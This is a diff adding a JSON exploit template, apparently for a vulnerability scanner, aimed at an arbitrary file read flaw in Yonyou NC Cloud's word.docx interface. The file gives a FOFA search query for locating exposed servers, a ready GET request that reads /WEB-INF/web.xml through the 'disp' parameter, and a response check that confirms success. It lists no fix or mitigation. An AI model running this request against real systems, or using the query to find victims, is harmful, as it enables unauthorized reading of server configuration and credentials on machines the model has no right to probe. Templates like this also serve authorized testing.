@@ -1,0 +1,33 @@
+{
+  "product": "用友NC Cloud",
+  "vul_name": "用友NC Cloud word.docx接口存在任意文件读取",
+  "type": "文件读取",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "用友NC Cloud word.docx接口存在任意文件读取漏洞",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "body=\"UClient.dmg\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_56698744/article/details/134787642",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/portal/docctr/open/word.docx?disp=/WEB-INF/web.xml"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "<web-app"
+        }
+      ]
+    }
+  }
+}
